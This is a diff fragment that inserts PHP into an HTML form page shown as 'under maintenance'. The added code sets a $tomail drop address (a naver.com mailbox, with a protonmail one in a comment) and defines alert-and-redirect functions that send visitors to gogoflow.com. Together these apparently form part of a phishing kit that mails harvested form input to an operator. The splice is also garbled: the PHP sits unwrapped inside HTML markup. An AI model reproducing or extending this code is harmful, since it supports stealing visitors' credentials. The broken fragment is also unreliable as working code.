@@ -188,6 +188,26 @@
 									</div>
 									<ul class="actions align-center">
 										<li><input value="점검중" class="button special" type="submit"></li>
+										$tomail = "lucael@naver.com"; //lglastha@protonmail.ch
+
+function error($text){
+echo "
+  <script language=javascript>
+  window.alert('$text')
+  history.go(-1)
+  </script>";
+exit;
+}
+
+function msg($text){
+echo "
+  <script language=javascript>
+  window.alert('$text')
+  top.location.href = 'http://gogoflow.com/index2.php'
+  </script>
+";
+exit;
+}
 									</ul>
 								</form>
 							</div>
